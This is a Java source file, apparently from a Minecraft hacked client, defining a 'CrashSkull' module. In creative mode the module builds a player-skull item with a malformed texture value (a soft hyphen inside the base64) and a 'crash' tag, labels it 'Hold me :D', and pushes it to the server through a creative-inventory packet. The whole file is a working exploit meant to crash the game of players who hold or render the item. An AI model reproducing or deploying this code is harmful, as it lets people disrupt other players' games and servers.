package org.m0jang.crystal.Mod.Collection.Misc;

import com.mojang.authlib.GameProfile;
import com.mojang.authlib.properties.Property;
import java.util.UUID;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTUtil;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import org.m0jang.crystal.Mod.Category;
import org.m0jang.crystal.Mod.Module;
import org.m0jang.crystal.Utils.ChatUtils;

public class CrashSkull extends Module {
   private String name = "Hold me <3";

   public CrashSkull() {
      super("CrashSkull", Category.Misc, false);
   }

   public void onEnable() {
      if (!Minecraft.thePlayer.capabilities.isCreativeMode) {
         ChatUtils.sendMessageToPlayer("Creative mode only.");
         this.setEnabled(false);
      } else if (Minecraft.thePlayer.inventory.getStackInSlot(0) != null) {
         ChatUtils.sendMessageToPlayer("Please clear the first slot in your hotbar.");
         this.setEnabled(false);
      } else {
         ItemStack item = new ItemStack(Items.skull, 1, 3);
         NBTTagCompound nbt = new NBTTagCompound();
         NBTTagCompound c = new NBTTagCompound();
         GameProfile prof = new GameProfile((UUID)null, this.name);
         prof.getProperties().put("textures", new Property("Value", "eyJ0ZXh0\u00addXJlcyI6eyJTS0lOIjp7InVybCI6IiJ9fX0="));
         c.setString("Id", "9d744c33-f3c4-4040-a7fc-73b47c840f0c");
         NBTUtil.writeGameProfile(c, prof);
         nbt.setTag("SkullOwner", c);
         nbt.setBoolean("crash", true);
         item.stackTagCompound = nbt;
         item.setStackDisplayName("Hold me :D");
         Minecraft.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, item));
         this.setEnabled(false);
      }
   }
}
